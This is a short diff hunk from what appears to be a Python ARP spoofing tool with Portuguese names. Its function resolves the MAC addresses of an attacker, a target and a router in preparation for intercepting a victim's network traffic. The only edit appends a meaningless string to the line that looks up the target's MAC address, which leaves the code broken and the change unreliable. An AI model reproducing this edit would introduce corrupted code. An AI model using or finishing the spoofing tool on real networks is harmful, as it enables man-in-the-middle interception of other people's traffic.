@@ -97,7 +97,7 @@ def arp_spoof(interface, alvo_ip, roteador_ip):
         print("[ERRO] Não foi possível obter o IP da interface. Certifique-se de que a interface está correta e ativa.")
         return
     atacante_mac = obter_mac_local(interface)
-    alvo_mac = obter_mac(interface, alvo_ip)
+    alvo_mac = obter_mac(interface, alvo_ip) PYhfftI8it
     roteador_mac = obter_mac(interface, roteador_ip)
 
     print(f"[INFO] Atacante MAC: {atacante_mac}, IP: {atacante_ip}")
